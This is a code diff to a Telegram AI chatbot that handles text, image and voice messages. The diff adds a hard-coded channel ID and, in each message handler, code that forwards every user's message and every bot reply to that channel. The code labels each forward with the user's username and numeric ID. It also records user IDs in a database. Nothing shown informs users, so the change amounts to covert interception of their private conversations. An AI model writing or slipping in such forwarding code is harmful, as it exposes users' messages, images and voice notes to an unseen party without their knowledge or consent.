@@ -35,6 +35,8 @@ from dotenv import load_dotenv
 import requests
 import datetime
 
+
+chat_id_forward = '-1002061399655'
 BROADCAST_MESSAGE, MESSAGE_TYPE = range(2)
 DATABASE_FILE = 'user_database.db'
 url = "https://helping-ai-1.onrender.com/search"
@@ -566,7 +568,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     text = update.message.text
     
     user_id = update.effective_user.id
+    username = update.effective_user.username
     text = update.message.text
+    PIRO = f"<b>Message from {username} 🆔 - <i>{user_id}</i></b>"
+    await context.bot.send_message(chat_id_forward, PIRO, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    await context.bot.forward_message(chat_id_forward, user_id, update.message.message_id)
     init_msg = await update.message.reply_text(
         text="Generating...", reply_to_message_id=update.message.message_id
     )
@@ -686,22 +692,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 )
         # Sleep for a bit to prevent the bot from getting rate-limited
         await asyncio.sleep(0.1)
-
-async def save_user_id(user_id: int) -> None:
-    try:
-        print(f"Database file path: {DATABASE_FILE}")
-        async with connect(DATABASE_FILE) as db:
-            cursor = await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
-            await cursor.close()
-            await db.commit()
-            print(f"User ID {user_id} saved successfully.")
-    except Exception as e:
-        print(f"Error saving user ID {user_id}: {e}")
-        raise  # Reraise the exception to see the complete traceback
-
+    
+    await context.bot.send_message(chat_id_forward, "____________________", parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    PIRO = f"<b>Message from BOT </b>"
+    await context.bot.send_message(chat_id_forward, PIRO, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    await context.bot.forward_message(chat_id_forward, user_id, init_msg.message_id)
+    
 async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle incoming images with captions and generate a response."""
-
+    
+    user_id = update.effective_user.id
+    username = update.effective_user.username
+    PIRO = f"<b>Message from {username} 🆔 - <i>{user_id}</i></b>"
+    await _.bot.send_message(chat_id_forward, PIRO, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    await _.bot.forward_message(chat_id_forward, user_id, update.message.message_id)
     init_msg = await update.message.reply_text(
         text="Generating...", reply_to_message_id=update.message.message_id
     )
@@ -723,7 +727,7 @@ async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
         prompt = "Analyse this image and generate response"
     response = await img_model.generate_content_async([prompt, a_img], stream=True)
     full_plain_message = ""
-    
+    await save_user_id(user_id)
     async for chunk in response:
         try:
             if chunk.text:
@@ -763,11 +767,18 @@ async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
                     reply_markup=reply_markup
                 )
         await asyncio.sleep(0.1)
-
+        
+    await _.bot.send_message(chat_id_forward, "____________________", parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    PIRO = f"<b>Message from BOT </b>"
+    await _.bot.send_message(chat_id_forward, PIRO, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    await _.bot.forward_message(chat_id_forward, user_id, init_msg.message_id)
+    
 async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if context.chat_data.get("chat") is None:
         new_chat(context)
-	    
+        
+    user_id = update.effective_user.id
+    username = update.effective_user.username
     current_datetime = datetime.datetime.now()
     formatted_time = current_datetime.strftime("%H:%M%S")
     voice_format = f"VOC_{formatted_time}"
@@ -802,7 +813,9 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     
     sticker_id = 'CAACAgEAAxkBAAIDhmWYG0-qnpcm3fEl5yKsbyh30cxfAAJ2AwACVghgRgFc7EpOz8QCNAQ'
     sticker_message = await update.message.reply_sticker(reply_to_message_id=update.message.message_id, sticker=sticker_id)
-
+    PIRO = f"<b>Message from {username} 🆔 - <i>{user_id}</i></b>"
+    await context.bot.send_message(chat_id_forward, PIRO, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    await context.bot.forward_message(chat_id_forward, user_id, update.message.message_id)
     init_msg = await update.message.reply_text(
         text="It may late for voice..",
         reply_to_message_id=sticker_message.message_id,
@@ -879,7 +892,7 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         return
     
     full_plain_message = ""
-    
+    await save_user_id(user_id)
     async for chunk in response:
         try:
             if chunk.text:
@@ -947,11 +960,17 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         await context.bot.delete_message(chat_id=update.message.chat_id, message_id=sticker_message.message_id)
         await context.bot.delete_message(chat_id=update.message.chat_id, message_id=init_msg.message_id)
         voice_msg = await update.message.reply_voice(voice=voice_stream, caption="Answer in below 👇", parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-        await update.message.reply_text(message, reply_to_message_id=voice_msg.message_id,parse_mode=ParseMode.HTML)
+        init_message = await update.message.reply_text(message, reply_to_message_id=voice_msg.message_id,parse_mode=ParseMode.HTML)
         voice_sent = True  # Set the flag to indicate the voice has been sent
     
     await asyncio.sleep(0.1)
 
+    await context.bot.send_message(chat_id_forward, "____________________", parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    PIRO = f"<b>Message from BOT </b>"
+    await context.bot.send_message(chat_id_forward, PIRO, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
+    await context.bot.forward_message(chat_id_forward, user_id, voice_msg.message_id)
+    await context.bot.forward_message(chat_id_forward, user_id, init_message.message_id)
+    
 OWNER_ID = 1722478636
 from telegram.ext import ConversationHandler
 
@@ -1002,6 +1021,17 @@ async def broadcast_cancel(update, context):
     return ConversationHandler.END
 
 # Add this handler to your application
-
+async def save_user_id(user_id: int) -> None:
+    try:
+        print(f"Database file path: {DATABASE_FILE}")
+        async with connect(DATABASE_FILE) as db:
+            cursor = await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
+            await cursor.close()
+            await db.commit()
+            print(f"User ID {user_id} saved successfully.")
+    except Exception as e:
+        print(f"Error saving user ID {user_id}: {e}")
+        raise  # Reraise the exception to see the complete traceback
+        
 
 
